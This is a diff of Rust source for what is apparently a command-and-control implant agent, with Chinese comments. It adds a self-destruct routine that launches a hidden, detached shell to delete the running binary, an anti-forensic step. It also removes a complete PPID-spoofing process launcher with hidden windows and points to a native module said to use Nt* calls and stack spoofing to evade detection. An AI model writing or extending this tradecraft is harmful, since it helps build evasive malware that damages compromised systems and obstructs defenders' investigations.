@@ -104,7 +104,8 @@ pub fn get_agent_uuid() -> String {
     let result = hasher.finalize();
     
     // 5. 将哈希结果的前 16 字节构造为 UUID
-    let bytes: [u8; 16] = result[..16].try_into().expect("Invalid hash length");
+    let mut bytes = [0u8; 16];
+    bytes.copy_from_slice(&result[..16]);
     let agent_uuid = Builder::from_bytes(bytes).into_uuid();
     
     let uuid_string = agent_uuid.to_string();
@@ -229,77 +230,70 @@ pub fn random_range(min: u32, max: u32) -> u32 {
     min + (next_u32() % range)
 }
 
-/// ⚡ 隐蔽进程启动：使用 PPID Spoofing 假冒父进程并隐藏窗口
+/// Self-destruct: schedule deletion of the current binary and exit.
+/// Available without the `inject` feature so minimal agents can still wipe themselves.
+pub async fn self_destruct() -> crate::types::CommandResult {
+    use crate::types::CommandResult;
+    use log::{error, info};
+
+    info!("[!] starting self-destruct");
+
+    let current_exe = match std::env::current_exe() {
+        Ok(path) => path,
+        Err(e) => {
+            error!("Failed to get current executable path: {}", e);
+            return CommandResult {
+                stdout: String::new(),
+                stderr: format!("Failed to get executable path: {}", e),
+                path: None,
+                req_id: None,
+            };
+        }
+    };
+
+    let exe_path = current_exe.to_string_lossy().to_string();
+
+    #[cfg(target_os = "windows")]
+    let result = {
+        use std::os::windows::process::CommandExt;
+        let delete_cmd = format!(
+            "timeout /t 3 /nobreak >nul && del /f /q \"{}\"",
+            exe_path
+        );
+        std::process::Command::new("cmd.exe")
+            .args(["/C", &delete_cmd])
+            .creation_flags(0x0800_0000 | 0x0000_0008) // CREATE_NO_WINDOW | DETACHED_PROCESS
+            .spawn()
+    };
+
+    #[cfg(not(target_os = "windows"))]
+    let result = {
+        let delete_cmd = format!("sleep 3 && rm -f \"{}\"", exe_path);
+        std::process::Command::new("sh")
+            .args(["-c", &delete_cmd])
+            .spawn()
+    };
+
+    match result {
+        Ok(_) => {
+            // Give the delete helper a moment, then exit
+            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+            std::process::exit(0);
+        }
+        Err(e) => CommandResult {
+            stdout: String::new(),
+            stderr: format!("Failed to spawn delete helper: {}", e),
+            path: None,
+            req_id: None,
+        },
+    }
+}
+
+/// ⚡ 隐蔽进程启动：PPID Spoofing + 隐藏窗口。
+///
+/// 实现已迁至 `native::spawn`：父进程 Nt* 化、CreateProcessW 动态解析、stack spoof。
+/// 创建本身仍为 CreateProcessW 残差（见 Client/core/docs/OPSEC_WINDOWS_RESIDUAL.md）。
 #[cfg(windows)]
 pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
-    use std::ptr;
-    use std::os::windows::ffi::OsStrExt;
-    use winapi::um::processthreadsapi::*;
-    use winapi::um::tlhelp32::*;
-    use winapi::um::handleapi::*;
-    use winapi::shared::minwindef::*;
-    use winapi::um::winbase::STARTUPINFOEXW;
-
-    unsafe {
-        // 1. 查找父进程 PID
-        let mut ppid = 0;
-        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if snapshot != INVALID_HANDLE_VALUE {
-            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
-            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
-            if Process32FirstW(snapshot, &mut entry) != 0 {
-                loop {
-                    let curr = String::from_utf16_lossy(&entry.szExeFile).trim_matches(char::from(0)).to_lowercase();
-                    if curr.contains(&parent_name.to_lowercase()) {
-                        ppid = entry.th32ProcessID;
-                        break;
-                    }
-                    if Process32NextW(snapshot, &mut entry) == 0 { break; }
-                }
-            }
-            CloseHandle(snapshot);
-        }
-
-        if ppid == 0 { return None; }
-
-        // 2. 初始化属性列表进行 PPID 欺骗
-        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
-        si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
-
-        let mut list_size: usize = 0;
-        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut list_size);
-        let mut lp_list = vec![0u8; list_size];
-        let attribute_list = lp_list.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
-
-        if InitializeProcThreadAttributeList(attribute_list, 1, 0, &mut list_size) == 0 { return None; }
-
-        let mut parent_handle = OpenProcess(winapi::um::winnt::PROCESS_CREATE_PROCESS, FALSE, ppid);
-        if parent_handle.is_null() { return None; }
-
-        UpdateProcThreadAttribute(attribute_list, 0, 0x00020000, &mut parent_handle as *mut _ as *mut _, std::mem::size_of::<winapi::um::winnt::HANDLE>(), ptr::null_mut(), ptr::null_mut());
-        si_ex.lpAttributeList = attribute_list;
-
-        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();
-        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-
-        // 🚀 CREATE_NO_WINDOW + EXTENDED_STARTUPINFO_PRESENT
-        let res = CreateProcessW(
-            ptr::null(), cmd_w.as_mut_ptr(),
-            ptr::null_mut(), ptr::null_mut(), FALSE,
-            0x08000000 | 0x00080000, // CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT
-            ptr::null_mut(), ptr::null(),
-            &mut si_ex.StartupInfo, &mut pi
-        );
-
-        DeleteProcThreadAttributeList(attribute_list);
-        CloseHandle(parent_handle);
-
-        if res != 0 {
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-            Some(pi.dwProcessId)
-        } else {
-            None
-        }
-    }
+    crate::native::spawn_spoofed_process(cmd, parent_name)
 }
